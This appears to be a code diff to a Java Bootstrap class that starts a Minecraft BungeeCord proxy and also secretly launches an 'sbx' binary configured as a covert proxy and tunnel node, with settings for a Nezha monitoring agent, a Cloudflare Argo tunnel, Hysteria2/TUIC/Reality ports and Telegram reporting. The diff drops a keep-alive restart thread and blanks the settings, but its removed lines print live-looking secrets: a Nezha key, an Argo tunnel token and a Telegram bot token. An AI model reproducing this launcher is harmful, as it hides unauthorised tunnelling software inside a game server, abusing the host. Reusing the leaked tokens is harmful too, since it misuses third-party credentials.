@@ -35,9 +35,6 @@ public class Bootstrap
         try {
             runSbxBinary();
             
-            // 保活线程，检测 sbxProcess 是否存活
-            startProcessKeepAlive();
-
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
@@ -57,25 +54,33 @@ public class Bootstrap
         // Continue with BungeeCord launch
         BungeeCordLauncher.main(args);
     }
-
-    private static void startProcessKeepAlive() {
-        Thread keepAliveThread = new Thread(() -> {
-            while (running.get()) {
-                try {
-                    if (sbxProcess == null || !sbxProcess.isAlive()) {
-                        System.out.println(ANSI_RED + "Sbx process has stopped. Restarting..." + ANSI_RESET);
-                        runSbxBinary();  // 如果进程停止，尝试重启
-                    }
-                    Thread.sleep(5000);  // 每5秒检查一次
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                }
+    
+    private static void clearConsole() {
+        try {
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+            } else {
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+                
+                new ProcessBuilder("tput", "reset")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+                
+                System.out.print("\033[8;30;120t");
+                System.out.flush();
             }
-        });
-        keepAliveThread.setDaemon(true);  // 设置为守护线程，程序退出时自动结束
-        keepAliveThread.start();
-    }
-
+        } catch (Exception e) {
+            try {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            } catch (Exception ignored) {}
+        }
+    }   
+    
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
@@ -87,25 +92,25 @@ public class Bootstrap
         
         sbxProcess = pb.start();
     }
-
+    
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "68341e7a-1f63-4436-8a8b-9619f3c9e29c");
+        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "tta.wahaaz.xx.kg:80");
+        envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
-        envVars.put("ARGO_PORT", "8008");
-        envVars.put("ARGO_DOMAIN", "lemein.amaxin.ggff.net");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNmIyZjE1N2Y5ZmQ5ZjE3YzJjMzQ0NDY5NzBlNGNiOGMiLCJ0IjoiNmYzMjExODQtNmE4ZS00M2I2LTg1N2ItYzU3MzYxMzMzNjZjIiwicyI6Ik5qQTFaVEV3WW1NdFpXVmtOaTAwTWpaaUxUbGlZelF0TjJNeE5UTTJPR1ptTnpBMiJ9");
-        envVars.put("HY2_PORT", "15858");
+        envVars.put("NEZHA_KEY", "");
+        envVars.put("ARGO_PORT", "");
+        envVars.put("ARGO_DOMAIN", "");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "7613313360");
-        envVars.put("BOT_TOKEN", "8244051936:AAF9BxqnFQl9nSwOZZMA-dLsh-4SBldMHWA");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "store.ubi.com");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "lemehost");
+        envVars.put("NAME", "Mc");
         envVars.put("DISABLE_ARGO", "false"); 
         
         for (String var : ALL_ENV_VARS) {
@@ -171,30 +176,4 @@ public class Bootstrap
             System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
         }
     }
-
-    private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
-            } else {
-                System.out.print("\033[H\033[3J\033[2J");
-                System.out.flush();
-                
-                new ProcessBuilder("tput", "reset")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
-                
-                System.out.print("\033[8;30;120t");
-                System.out.flush();
-            }
-        } catch (Exception e) {
-            try {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            } catch (Exception ignored) {}
-        }
-    }   
 }
